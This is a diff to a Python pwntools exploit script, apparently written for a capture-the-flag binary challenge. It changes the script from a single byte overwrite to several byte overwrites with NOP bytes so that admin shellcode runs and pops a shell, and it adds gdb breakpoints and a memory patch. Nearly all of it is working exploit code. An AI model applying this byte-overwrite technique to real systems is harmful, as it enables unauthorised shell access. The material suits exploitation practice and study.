@@ -13,10 +13,19 @@ Goal: Overwrite one byte of admin_shellcode with a non-null byte
       to pop a shell.
 '''
 
-offset = [36]
-byte = [b'\x50']
+offset = [36, 12, 13]
+byte = [b'\x50', b'\x90',b'\x90']
 
 assert all([offset[i] < 0x28 and offset[i] > -1 and byte[i] != b'\0' for i in range(len(offset))])
+
+def interact_round(i):
+    print(f"#### Interact round {i}, setting byte {offset[i]} to {hex(byte[i][0])} ####")
+    print(p.recvuntil(b"write to (0-39): > "))
+    print('>>>',offset[i])
+    p.sendline(str(offset[i]).encode())
+    print(p.recv())
+    print('>>>',byte[i])
+    p.send(byte[i])
 
 print("Not super reliable; if it hangs just do ^C and try running again\n")
 
@@ -29,6 +38,8 @@ else:
         #+'break *0x00400b4e\n'#3_runGame
          +'break *0x00400a06\n'#4_UserAttack
          +'break *0x006020c0\n'#5_Payload
+         +'c\n'#load the program
+         +'set *((char *)0x6020c0) = 0x90\n'#fix weird local issue
         )
         )
 
@@ -37,15 +48,8 @@ print(p.recv())
 print('3')
 p.sendline(b"3")
 
-print(p.recvuntil(b"write to (0-39): > "))
-
-print(offset[0])
-p.sendline(str(offset[0]).encode())
-
-print(p.recv())
-
-print(byte[0])
-p.sendline(byte[0])
+for i in range(len(offset)):
+    interact_round(i)
 
 print(p.recv())
 
